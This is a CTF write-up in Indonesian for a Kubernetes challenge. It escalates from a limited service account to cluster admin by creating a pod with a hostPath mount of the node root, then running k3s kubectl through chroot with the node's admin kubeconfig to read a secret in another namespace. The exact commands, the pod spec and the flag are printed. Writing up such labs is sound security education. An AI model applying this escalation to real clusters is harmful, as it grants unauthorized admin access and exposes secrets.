# Quiet Witness

## Ringkasan

`kubeconfig.yaml` berisi token service account `maintenance/witness-operator`.
RBAC akun ini terlihat seperti akun audit, tetapi akun tersebut juga punya izin
`create` dan `delete` untuk `pods` di namespace `maintenance`.

Izin itu cukup untuk membuat pod sementara dengan mount `hostPath: /`. Dari pod
tersebut, filesystem node bisa dibaca, termasuk kubeconfig admin K3s di
`/etc/rancher/k3s/k3s.yaml`. Dengan menjalankan binary `k3s kubectl` dari node
melalui `chroot`, secret di namespace lain bisa dibaca dan flag ditemukan di
`findings/witness-findings`.

## File Challenge

- `kubeconfig.yaml`: kubeconfig awal untuk mengakses API Kubernetes challenge.
- `solve.py`: script reproduksi yang membuat pod audit sementara, membaca secret
  target lewat kubeconfig admin node, lalu menghapus pod tersebut.

## Analisis Awal

Enumerasi awal:

```bash
file *
ls -la
find . -maxdepth 3 -type f | sort
```

Hasilnya hanya ada `kubeconfig.yaml`. Token JWT di dalamnya terdecode sebagai:

```text
system:serviceaccount:maintenance:witness-operator
```

Pengecekan RBAC:

```bash
kubectl --kubeconfig kubeconfig.yaml auth can-i --list -n maintenance
```

Izin penting:

```text
pods: create delete get list
secrets/configmaps/services/deployments/roles/rolebindings: get list
pods/log: get
nodes/namespaces: get list
```

Resource namespace lain tidak bisa dibaca langsung. Namespace `findings` terlihat
dari daftar namespace, tetapi secret di sana ditolak untuk akun awal.

## Temuan Penting

Di namespace `maintenance`, akun `witness-operator` dapat membuat pod. Pod yang
dibuat tidak dibatasi sehingga bisa memakai:

```yaml
hostNetwork: true
volumes:
- name: hostroot
  hostPath:
    path: /
```

Mount ini membuka filesystem node di `/host`. Di sana ada binary dan kubeconfig
admin K3s:

```text
/host/usr/local/bin/k3s
/host/etc/rancher/k3s/k3s.yaml
```

Dengan `chroot /host`, kubectl admin internal bisa dijalankan dari pod.

## Proses Ekstraksi

Pod audit sementara menjalankan:

```bash
chroot /host /usr/local/bin/k3s kubectl \
  --kubeconfig /etc/rancher/k3s/k3s.yaml \
  -n findings get secret witness-findings -o jsonpath='{.data.flag}'
```

Output field `data.flag` adalah base64:

```text
dWN0Zns3NDVmZTcyN2NiYmQxYTBmYmNlMmE2ZDBkYTU4MmZlZjU2MDl9
```

Setelah didecode:

```text
uctf{745fe727cbbd1a0fbce2a6d0da582fef5609}
```

## Solve Script

`solve.py` melakukan langkah yang sama secara otomatis:

1. Menghapus pod lama bernama `quiet-witness-solve` jika ada.
2. Membuat pod baru di namespace `maintenance`.
3. Mount root node secara read-only ke `/host`.
4. Menjalankan `k3s kubectl` admin dari dalam `chroot`.
5. Mengambil secret `findings/witness-findings`.
6. Decode base64 flag.
7. Cleanup pod sementara.

## Cara Menjalankan

```bash
python3 solve.py
```

Output:

```text
uctf{745fe727cbbd1a0fbce2a6d0da582fef5609}
```

## Flag

```text
uctf{745fe727cbbd1a0fbce2a6d0da582fef5609}
```

## Catatan

Masalah utamanya bukan secret yang bisa dibaca langsung dari akun awal, tetapi
izin `pods/create` yang terlalu longgar. Di cluster tanpa policy pembatas, izin
itu dapat berubah menjadi akses node lewat `hostPath`, lalu menjadi akses admin
cluster karena credential K3s tersimpan di filesystem node.
